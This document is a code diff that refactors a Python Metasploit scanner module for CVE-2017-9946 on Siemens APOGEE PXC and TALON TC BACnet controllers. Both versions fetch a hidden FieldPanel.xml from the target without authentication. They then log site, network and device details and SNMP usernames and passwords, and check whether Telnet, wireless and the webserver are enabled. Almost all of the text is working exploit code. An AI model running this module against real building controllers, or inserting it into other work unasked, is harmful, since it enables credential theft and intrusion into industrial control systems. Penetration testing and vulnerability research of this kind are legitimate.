@@ -1,102 +1,129 @@
 #!/usr/bin/env python3
-
 # -*- coding: utf-8 -*-
-# 2022-05-23
+"""Siemens BACnet Field Panel Path Traversal Scanner.
 
-# Standard Modules
+Exploits a hidden directory on Siemens APOGEE PXC and TALON TC BACnet Automation
+Controllers (all versions prior to V3.5). The module pulls **FieldPanel.xml** to
+collect configuration and credential data without authentication.
+"""
+from __future__ import annotations
+
+import logging
+import socket
+import struct
+import xml.etree.ElementTree as ET
+from typing import Any, Dict
+
 from metasploit import module
 
-# Extra Dependencies
+# Third-party dependencies -----------------------------------------------------
 dependencies_missing = False
 try:
-    import logging
-    import requests
-    import xmltodict
-    import xml.etree.ElementTree as ET
-    import socket
-    import struct
+    import requests  # type: ignore
+    import xmltodict  # noqa: F401  (unused for now, but handy for later work)
 except ImportError:
     dependencies_missing = True
 
-# Metasploit Metadata
-metadata = {
-    'name': 'Siemens BACnet Field Panel Path Traversal',
-    'description': '''
-        This module exploits a hidden directory on Siemens APOGEE PXC BACnet Automation Controllers (all versions prior to V3.5), and TALON TC BACnet Automation Controllers (all versions prior to V3.5). With a 7.5 CVSS, this exploit allows for an attacker to perform an authentication bypass using an alternate path or channel to enumerate hidden directories in the web server.
-    ''',
-    'authors': [
-        'RoseSecurity',
+# -----------------------------------------------------------------------------
+# Metasploit metadata
+# -----------------------------------------------------------------------------
+METADATA: Dict[str, Any] = {
+    "name": "Siemens BACnet Field Panel Path Traversal",
+    "description": (
+        "This module exploits a hidden directory on Siemens APOGEE PXC BACnet "
+        "Automation Controllers (all versions prior to V3.5) and TALON TC BACnet "
+        "Automation Controllers (all versions prior to V3.5). With a 7.5 CVSS, "
+        "the exploit lets an attacker bypass authentication and enumerate hidden "
+        "directories on the embedded webserver."
+    ),
+    "authors": [
+        "RoseSecurity",
     ],
-    'date': '2022-05-23',
-    'license': 'MSF_LICENSE',
-    'references': [
-        {'type': 'url', 'ref': 'https://sid.siemens.com/v/u/A6V10304985'},
-        {'type': 'cve', 'ref': 'https://nvd.nist.gov/vuln/detail/CVE-2017-9946'},
+    "date": "2022-05-23",
+    "license": "MSF_LICENSE",
+    "references": [
+        {"type": "url", "ref": "https://sid.siemens.com/v/u/A6V10304985"},
+        {"type": "cve", "ref": "https://nvd.nist.gov/vuln/detail/CVE-2017-9946"},
     ],
-    'type': 'single_scanner',
-    'options': {
-        'rhost': {'type': 'string', 'description': 'Target address', 'required': True, 'default': None},
-    }
+    "type": "single_scanner",
+    "options": {
+        "rhost": {
+            "type": "string",
+            "description": "Target address",
+            "required": True,
+            "default": None,
+        },
+    },
 }
 
-def run(args):
-    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
+# XML element indexes mapped to human-readable labels (order matters).
+XML_FIELDS = [
+    (18, "Remote Site ID"),
+    (26, "Building Level Network Name"),
+    (27, "Site Name"),
+    (28, "Hostname"),
+    (30, "IP Address"),
+    (32, "Gateway IP Address"),
+    (57, "Maximum Transmission Size"),
+    (60, "BACnet Device Name"),
+    (62, "BACnet UDP Port"),
+    (63, "Device Location"),
+    (64, "Device Description"),
+    (88, "Device Barcode"),
+    (104, "Device Revision String"),
+    (105, "Device Firmware"),
+    (109, "Panel Key Name"),
+    (148, "SNMP Username"),
+    (149, "SNMP Private Password"),
+    (150, "SNMP Authorization Password"),
+]
+
+# Service flags: (XML index, value that means "enabled").
+SERVICE_FLAGS = {
+    "Telnet": (48, 1),
+    "Wireless": (84, 1),
+    "Webserver": (103, 3),
+}
+
+
+def _hex_to_ip(hex_str: str) -> str:
+    """Convert a hex-encoded IP address to dotted-quad notation."""
+    return socket.inet_ntoa(struct.pack(">L", int(hex_str, 16)))
+
+
+def run(args: Dict[str, Any]) -> None:  # noqa: D401  (Metasploit API requirement)
+    """Metasploit entrypoint required by `module.run`."""
+    module.LogHandler.setup(msg_prefix=f"{args['rhost']} - ")
+
     if dependencies_missing:
-        logging.error('Module dependency (requests) is missing, cannot continue')
+        logging.error("Module dependency (requests) is missing, cannot continue")
         return
 
     try:
-        # Download Hidden XML File
-        r = requests.get('http://{}/{}'.format(args['rhost'], '/FieldPanel.xml'), verify=False)
-
-        # Convert to Readable Format
-        xml_doc = r.content
-        root = ET.fromstring(xml_doc)
-
-        # Parse XML for Sensitive Data
-        module.log("Remote Site ID: " + root[18].text)
-        module.log("Building Level Network Name: " + root[26].text)
-        module.log("Site Name: " + root[27].text)
-        module.log("Hostname: " + root[28].text)
-        ip_addr = int(root[30].text, 16)
-        module.log("IP Address: " + socket.inet_ntoa(struct.pack(">L", ip_addr)))
-        gw_addr = int(root[32].text, 16)
-        gw_addr = str(socket.inet_ntoa(struct.pack(">L", gw_addr)))
-        module.log("Gateway IP Address: " + gw_addr)
-        module.log("Maximum Transmission Size: " + root[57].text)
-        module.log("BACnet Device Name: " + root[60].text)
-        module.log("BACnet UDP Port: " + root[62].text)
-        module.log("Device Location: " + root[63].text)
-        module.log("Device Description: " + root[64].text)
-        module.log("Device Barcode: " + root[88].text)
-        module.log("Device Revision String: " + root[104].text)
-        module.log("Device Firmware: " + root[105].text)
-        module.log("Panel Key Name: " + root[109].text)
-        module.log("SNMP Username: " + root[148].text)
-        module.log("SNMP Private Password: " + root[149].text)
-        module.log("SNMP Authorization Password: " + root[150].text)
-
-        # Determine Running Services
-        if int(root[48].text) == 1:
-            module.log("Telnet Enabled")
-        else:
-            module.log("Telnet Disabled")
-
-        if int(root[84].text) == 1:
-            module.log("Wireless Enabled")
-        else:
-            module.log("Wireless Disabled")
-
-        if int(root[103].text) == 3:
-            module.log("Webserver Enabled")
-        else:
-            module.log("Webserver Disabled")
-
-    except requests.exceptions.RequestException as e:
-        logging.error('{}'.format(e))
+        resp = requests.get(
+            f"http://{args['rhost']}/FieldPanel.xml",  # nosec B310 -- target is user-supplied
+            verify=False,
+            timeout=10,
+        )
+        resp.raise_for_status()
+    except requests.exceptions.RequestException as exc:  # type: ignore[attr-defined]
+        logging.error("%s", exc)
         return
 
+    root = ET.fromstring(resp.content)
 
-if __name__ == '__main__':
-    module.run(metadata, run)
+    # Standard XML fields -----------------------------------------------------
+    for idx, label in XML_FIELDS:
+        value = root[idx].text  # type: ignore[index]
+        if idx in (30, 32):  # IPs are hex-encoded
+            value = _hex_to_ip(value)  # type: ignore[arg-type]
+        module.log(f"{label}: {value}")
 
+    # Service flags -----------------------------------------------------------
+    for service, (idx, enabled_val) in SERVICE_FLAGS.items():
+        status = "Enabled" if int(root[idx].text) == enabled_val else "Disabled"  # type: ignore[index]
+        module.log(f"{service} {status}")
+
+
+if __name__ == "__main__":
+    module.run(METADATA, run)
